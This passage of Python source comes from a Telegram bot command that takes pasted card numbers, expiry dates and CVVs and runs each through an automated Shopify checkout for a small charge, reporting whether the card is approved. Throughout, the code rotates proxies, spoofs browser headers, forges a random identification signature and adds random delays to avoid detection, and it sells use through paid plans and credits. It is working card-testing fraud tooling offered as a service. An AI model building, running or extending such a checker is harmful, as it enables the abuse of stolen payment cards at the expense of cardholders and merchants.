                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "geolocation": {
                                "coordinates": {
                                    "latitude": 40.18073830000001,
                                    "longitude": -75.14480139999999
                                },
                                "countryCode": "US"
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": self.delivery_strategy_handle,
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {
                            "lines": [{
                                "stableId": stable_id
                            }]
                        },
                        "deliveryMethodTypes": ["PICK_UP"],
                        "expectedTotalPrice": {
                            "value": {
                                "amount": "0.00",
                                "currencyCode": "USD"
                            }
                        },
                        "destinationChanged": True
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": []
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {
                            "items": {
                                "value": 1
                            }
                        },
                        "expectedTotalPrice": {
                            "value": {
                                "amount": "0.55",
                                "currencyCode": "USD"
                            }
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "memberships": {
                    "memberships": []
                },
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": "8 Log Pond Drive",
                            "address2": "",
                            "city": "Horsham",
                            "countryCode": "US",
                            "postalCode": "19044",
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": "PA",
                            "phone": ""
                        }
                    }
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "email": self.email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [],
                    "shopPayOptInPhone": {
                        "countryCode": "US"
                    },
                    "rememberMe": False
                },
                "tip": {
                    "tipLines": []
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {
                        "value": {
                            "amount": "0.03",
                            "currencyCode": "USD"
                        }
                    },
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {
                    "message": None,
                    "customAttributes": []
                },
                "localizationExtension": {
                    "fields": []
                },
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {
                    "buyerRefusesDuties": False
                },
                "cartMetafields": []
            }

            proposal_headers = {
                'authority': 'meta-app-prod-store-1.myshopify.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': self.base_url,
                'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us/",
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # Don't send x-checkout-one-session-token for first request
                'x-checkout-web-build-id': '0e1aa4a2d0226841954371a4b7b45388eaac3ef4',
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': self.checkout_token
            }

            proposal_payload = {
                "operationName": "Proposal",
                "variables": proposal_variables,
                "id": self.proposal_id
            }

            self.logger.data_extracted("Proposal Variables", json.dumps(proposal_variables, indent=2)[:200] + "...", "Constructed")

            try:
                resp = await self.client.post(
                    graphql_url,
                    headers=proposal_headers,
                    json=proposal_payload,
                    timeout=30
                )

                if resp.status_code != 200:
                    return False, f"Proposal failed: {resp.status_code}"

                # FIXED: Extract session token from response headers
                resp_headers = dict(resp.headers)
                self.session_token = resp_headers.get('x-checkout-one-session-token')
                
                if not self.session_token:
                    # Try to extract from response body if present
                    try:
                        proposal_resp = resp.json()
                        # Check if token is in response data
                        if 'data' in proposal_resp and 'proposal' in proposal_resp['data']:
                            proposal_data = proposal_resp['data']['proposal']
                            if 'sessionToken' in proposal_data:
                                self.session_token = proposal_data['sessionToken']
                    except:
                        pass
                
                if not self.session_token:
                    self.logger.error_log("TOKEN", "Could not extract session token from Proposal response headers or body")
                    return False, "SESSION_TOKEN_NOT_FOUND"

                self.logger.data_extracted("Session Token from Proposal", self.session_token[:50] + "...", "Response Headers")
                
                # Update graphql session token with real one
                self.graphql_session_token = self.session_token

                # Check for errors in response
                try:
                    proposal_resp = resp.json()
                    if 'errors' in proposal_resp and proposal_resp['errors']:
                        error_msg = proposal_resp['errors'][0].get('message', 'Unknown error')
                        if ":" in error_msg:
                            error_msg = error_msg.split(":")[0].strip()
                        return False, f"Proposal error: {error_msg}"
                except Exception as e:
                    return False, f"Failed to parse Proposal response: {str(e)[:50]}"

            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on proposal: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except Exception as e:
                self.logger.error_log("PROPOSAL_ERROR", f"Proposal error: {str(e)}")
                return False, f"Proposal error: {str(e)[:50]}"

            await self.random_delay(1, 2)

            # Step 7: Create payment session with PCI
            self.step(7, "CREATE PAYMENT", "Creating payment session with PCI and proxy")

            pci_headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
                'shopify-identification-signature': f'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.{self.generate_random_string(100)}.{self.generate_random_string(43)}',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
            }

            card_number = cc.replace(" ", "").replace("-", "")
            year_full = ano if len(ano) == 4 else f"20{ano}"
            month_int = int(mes)

            pci_payload = {
                "credit_card": {
                    "number": card_number,
                    "month": month_int,
                    "year": int(year_full),
                    "verification_value": cvv,
                    "name": self.full_name,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": ""
                },
                "payment_session_scope": "meta-app-prod-store-1.myshopify.com"
            }

            payment_session_id = None
            payment_method_identifier = None
            pci_success = False
            
            for pci_attempt in range(3):
                try:
                    pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=45)
                    
                    resp = await pci_client.post(
                        'https://checkout.pci.shopifyinc.com/sessions',
                        headers=pci_headers,
                        json=pci_payload,
                        timeout=45
                    )

                    if resp.status_code == 200:
                        try:
                            pci_resp = resp.json()
                            payment_session_id = pci_resp.get('id')
                            payment_method_identifier = pci_resp.get('payment_method_identifier')
                            if payment_session_id:
                                self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
                                pci_success = True
                                await pci_client.aclose()
                                break
                            else:
                                await pci_client.aclose()
                                if pci_attempt < 2:
                                    self.logger.error_log("PCI_RETRY", f"No payment session ID, retrying... (Attempt {pci_attempt + 1})")
                                    await asyncio.sleep(1)
                                    continue
                                return False, "PCI_ERROR_NO_SESSION_ID"
                        except Exception as e:
                            await pci_client.aclose()
                            if pci_attempt < 2:
                                self.logger.error_log("PCI_RETRY", f"Parse error, retrying... (Attempt {pci_attempt + 1})")
                                await asyncio.sleep(1)
                                continue
                            return False, f"PCI_ERROR_PARSE: {str(e)[:50]}"
                    else:
                        await pci_client.aclose()
                        if pci_attempt < 2:
                            self.logger.error_log("PCI_RETRY", f"Status {resp.status_code}, retrying... (Attempt {pci_attempt + 1})")
                            mark_proxy_failed(self.proxy_url)
                            self.proxy_url = get_proxy_for_user(self.user_id, "random")
                            if not self.proxy_url:
                                return False, "NO_PROXY_AVAILABLE"
                            self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                            await asyncio.sleep(1)
                            continue
                        return False, f"PCI_ERROR_STATUS_{resp.status_code}"

                except httpx.ProxyError as e:
                    mark_proxy_failed(self.proxy_url)
                    if pci_attempt < 2:
                        self.logger.error_log("PCI_RETRY", f"Proxy error, rotating... (Attempt {pci_attempt + 1})")
                        self.proxy_url = get_proxy_for_user(self.user_id, "random")
                        if not self.proxy_url:
                            return False, "NO_PROXY_AVAILABLE"
                        self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                        await asyncio.sleep(1)
                        continue
                    self.logger.error_log("PCI", f"Proxy error on PCI: {str(e)}")
                    self.proxy_status = "Dead 🚫"
                    return False, "PROXY_DEAD"
                except Exception as e:
                    if pci_attempt < 2:
                        self.logger.error_log("PCI_RETRY", f"Error: {str(e)[:50]}, retrying... (Attempt {pci_attempt + 1})")
                        await asyncio.sleep(1)
                        continue
                    self.logger.error_log("PCI_ERROR", f"PCI error: {str(e)}")
                    return False, f"PCI_ERROR: {str(e)[:50]}"
            
            if not pci_success:
                return False, "PCI_ERROR_MAX_RETRIES"

            await self.random_delay(1, 2)

            # Step 8: Submit for completion
            self.step(8, "SUBMIT PAYMENT", "Submitting payment for processing with proxy")

            attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"

            submit_variables = {
                "input": {
                    "sessionInput": {
                        "sessionToken": self.graphql_session_token
                    },
                    "queueToken": f"{self.generate_random_string(43)}==",
                    "discounts": {
                        "lines": [],
                        "acceptUnexpectedDiscounts": True
                    },
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "geolocation": {
                                    "coordinates": {
                                        "latitude": 40.18073830000001,
                                        "longitude": -75.14480139999999
                                    },
                                    "countryCode": "US"
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": self.delivery_strategy_handle,
                                    "customDeliveryRate": False
                                },
                                "options": {}
                            },
                            "targetMerchandiseLines": {
                                "lines": [{
                                    "stableId": stable_id
                                }]
                            },
                            "deliveryMethodTypes": ["PICK_UP"],
                            "expectedTotalPrice": {
                                "value": {
                                    "amount": "0.00",
                                    "currencyCode": "USD"
                                }
                            },
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": []
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {
                                "items": {
                                    "value": 1
                                }
                            },
                            "expectedTotalPrice": {
                                "value": {
                                    "amount": "0.55",
                                    "currencyCode": "USD"
                                }
                            },
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "memberships": {
                        "memberships": []
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_method_identifier if payment_method_identifier else "",
                                    "sessionId": payment_session_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": "8 Log Pond Drive",
                                            "address2": "",
                                            "city": "Horsham",
                                            "countryCode": "US",
                                            "postalCode": "19044",
                                            "firstName": self.first_name,
                                            "lastName": self.last_name,
                                            "zoneCode": "PA",
                                            "phone": ""
                                        }
                                    },
                                    "cardSource": None
                                },
                                "giftCardPaymentMethod": None,
                                "redeemablePaymentMethod": None,
                                "walletPaymentMethod": None,
                                "walletsPlatformPaymentMethod": None,
                                "localPaymentMethod": None,
                                "paymentOnDeliveryMethod": None,
                                "paymentOnDeliveryMethod2": None,
                                "manualPaymentMethod": None,
                                "customPaymentMethod": None,
                                "offsitePaymentMethod": None,
                                "customOnsitePaymentMethod": None,
                                "deferredPaymentMethod": None,
                                "customerCreditCardPaymentMethod": None,
                                "paypalBillingAgreementPaymentMethod": None,
                                "remotePaymentInstrument": None
                            },
                            "amount": {
                                "value": {
                                    "amount": "0.58",
                                    "currencyCode": "USD"
                                }
                            }
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "8 Log Pond Drive",
                                "address2": "",
                                "city": "Horsham",
                                "countryCode": "US",
                                "postalCode": "19044",
                                "firstName": self.first_name,
                                "lastName": self.last_name,
                                "zoneCode": "PA",
                                "phone": ""
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": "USD",
                            "countryCode": "US"
                        },
                        "email": self.email,
                        "emailChanged": False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [],
                        "shopPayOptInPhone": {
                            "countryCode": "US"
                        },
                        "rememberMe": False
                    },
                    "tip": {
                        "tipLines": []
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {
                            "value": {
                                "amount": "0.03",
                                "currencyCode": "USD"
                            }
                        },
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": []
                    },
                    "localizationExtension": {
                        "fields": []
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {
                        "buyerRefusesDuties": False
                    },
                    "cartMetafields": []
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}",
                    "pageId": f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}"
                }
            }

            submit_payload = {
                "operationName": "SubmitForCompletion",
                "variables": submit_variables,
                "id": self.submit_id
            }

            self.logger.data_extracted("Submit Variables", json.dumps(submit_variables, indent=2)[:200] + "...", "Constructed")

            try:
                resp = await self.client.post(
                    graphql_url,
                    headers=proposal_headers,
                    json=submit_payload,
                    timeout=30
                )

                if resp.status_code != 200:
                    return False, f"Submit failed: {resp.status_code}"

                try:
                    submit_resp = resp.json()

                    if 'errors' in submit_resp and submit_resp['errors']:
                        error_msg = submit_resp['errors'][0].get('message', 'Unknown error')
                        if ":" in error_msg:
                            error_msg = error_msg.split(":")[0].strip()
                        return False, f"Submit error: {error_msg}"

                    data = submit_resp.get('data', {}).get('submitForCompletion', {})
                    receipt = data.get('receipt', {})
                    self.receipt_id = receipt.get('id')

                    if not self.receipt_id:
                        self.logger.error_log("NO_RECEIPT", f"Full response: {json.dumps(submit_resp, indent=2)[:500]}")
                        return False, "No receipt ID in submit response"

                    self.logger.data_extracted("Receipt ID", self.receipt_id, "Submit")

                    if receipt.get('__typename') == 'ProcessingReceipt':
                        poll_delay = receipt.get('pollDelay', 500) / 1000

                        self.step(9, "POLL RECEIPT", f"Waiting {poll_delay}s then polling for result")

                        await asyncio.sleep(poll_delay)

                        return await self.poll_receipt(proposal_headers)
                    else:
                        return False, f"Unexpected receipt type: {receipt.get('__typename')}"

                except Exception as e:
                    return False, f"Failed to parse submit response: {str(e)[:50]}"

            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on submit: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except Exception as e:
                self.logger.error_log("SUBMIT_ERROR", f"Submit error: {str(e)}")
                return False, f"Submit error: {str(e)[:50]}"

        except httpx.RequestError as e:
            self.logger.error_log("NETWORK", f"Network error: {str(e)}")
            error_str = str(e).lower()
            if "connection error" in error_str or "pci error" in error_str:
                return False, "PROXY_DEAD"
            return False, f"Network error: {str(e)[:50]}"
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            error_str = str(e).lower()
            if "connection error" in error_str or "pci error" in error_str:
                return False, "PROXY_DEAD"
            return False, f"Checkout error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()

    async def poll_receipt(self, headers):
        try:
            graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"

            poll_params = {
                'operationName': 'PollForReceipt',
                'variables': f'{{"receiptId":"{self.receipt_id}","sessionToken":"{self.graphql_session_token}"}}',
                'id': '8d6301ed4a2c3f2cb34599828e84a6346a9243ddc8e54a772b1515aced846c71'
            }

            try:
                resp = await self.client.get(
                    graphql_url,
                    headers={**headers, 'accept': 'application/json'},
                    params=poll_params,
                    timeout=30
                )

                if resp.status_code != 200:
                    poll_payload = {
                        "operationName": "PollForReceipt",
                        "variables": {
                            "receiptId": self.receipt_id,
                            "sessionToken": self.graphql_session_token
                        },
                        "id": "8d6301ed4a2c3f2cb34599828e84a6346a9243ddc8e54a772b1515aced846c71"
                    }
                    resp = await self.client.post(graphql_url, headers=headers, json=poll_payload, timeout=30)

                if resp.status_code != 200:
                    return False, f"Poll failed: {resp.status_code}"

                try:
                    poll_resp = resp.json()
                    receipt_data = poll_resp.get('data', {}).get('receipt', {})

                    receipt_type = receipt_data.get('__typename', '')

                    if receipt_type == 'FailedReceipt':
                        error_info = receipt_data.get('processingError', {})
                        error_code = error_info.get('code', 'UNKNOWN')
                        error_msg = error_info.get('messageUntranslated', 'Payment failed')
                        return False, f"DECLINED - {error_code}"

                    elif receipt_type == 'ProcessedReceipt':
                        purchase_order = receipt_data.get('purchaseOrder', {})
                        if purchase_order:
                            return True, "ORDER_PLACED"
                        return True, "ORDER_PLACED"

                    elif receipt_type == 'ProcessingReceipt':
                        await asyncio.sleep(0.5)
                        return await self.poll_receipt(headers)

                    else:
                        return False, f"Unknown receipt status: {receipt_type}"

                except Exception as e:
                    return False, f"Failed to parse poll response: {str(e)[:50]}"

            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on poll: {str(e)}")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return False, "PROXY_DEAD"
            except Exception as e:
                return False, f"Poll error: {str(e)[:50]}"

        except Exception as e:
            return False, f"Poll error: {str(e)[:50]}"


# ========== MAIN CHECKER CLASS ==========
class ShopifyChargeCheckerHTTP:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            checker = ShopifyHTTPCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            self.logger.complete_result(False, "UNKNOWN_ERROR", str(e), elapsed_time)
            try:
                cc = cc_parts[0]
                mes = cc_parts[1]
                ano = cc_parts[2]
                cvv = cc_parts[3]
            except:
                cc = mes = ano = cvv = ""
            error_msg = str(e)
            if ":" in error_msg:
                error_msg = error_msg.split(":")[0].strip()
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {error_msg[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        if not PROXY_SYSTEM_AVAILABLE:
            await message.reply("""<pre>❌ Proxy System Unavailable</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Proxy system is not available.
🠪 <b>Solution</b>: <code>Ensure BOT/tools/proxy.py exists and is working</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        processing_msg = await message.reply(
            f"""
<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>Getting proxy...</code>
<b>[•] Response</b>- <code>Acquiring proxy from pool...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyChargeCheckerHTTP(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_details,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="sh",
                    gateway_name="Shopify Charge"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
